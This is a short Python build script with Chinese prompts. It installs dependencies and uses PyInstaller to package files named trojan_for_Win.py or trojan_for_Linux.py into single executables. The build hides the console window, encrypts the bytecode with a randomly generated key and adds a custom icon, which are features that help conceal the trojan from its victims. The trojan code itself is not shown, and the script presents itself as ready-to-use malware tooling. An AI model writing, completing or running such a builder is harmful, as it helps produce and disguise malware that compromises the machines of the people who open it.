from os import system,name
from hashlib import md5
from random import randint
input("请确保你的 settings.py 文件的信息已经填写对了，如果填写对了就敲回车!!!")
print("正在安装依赖中...")
n = 1
if name == "nt":
    n = system("pip install -r requirements.txt")
else:
    n = system("pip3 install -r requirements.txt")
if n == 0:
    print("正在打包中...")
    key = md5((str(randint(1,65535))+"pkcn").encode("utf-8")).hexdigest()
    if name == "nt":
        system("pyinstaller -F --noconsole --key="+key+" --icon pkcn.ico trojan_for_Win.py")
    else:
        system("pyinstaller -F --noconsole --key="+key+" --icon pkcn.ico trojan_for_Linux.py")


